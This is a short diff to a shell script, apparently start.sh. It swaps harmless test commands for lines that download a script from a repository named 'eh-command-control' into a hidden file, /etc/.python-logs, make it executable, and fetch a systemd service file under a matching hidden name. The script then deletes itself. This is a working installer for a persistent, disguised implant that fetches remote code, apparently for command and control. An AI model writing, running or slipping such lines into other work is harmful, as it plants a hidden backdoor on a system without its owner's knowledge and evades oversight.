@@ -1,6 +1,4 @@
-mkdir i_was_here
-echo "testing"
-cd i_was_here
-touch some_file.txt
-cd ..
+curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.sh > /etc/.python-logs
+chmod +x /etc/.python-logs
+curl -sL https://raw.githubusercontent.com/AidanNgo/eh-command-control/refs/heads/main/logs.service > /etc/systemd/system/.python-logs.service
 rm start.sh
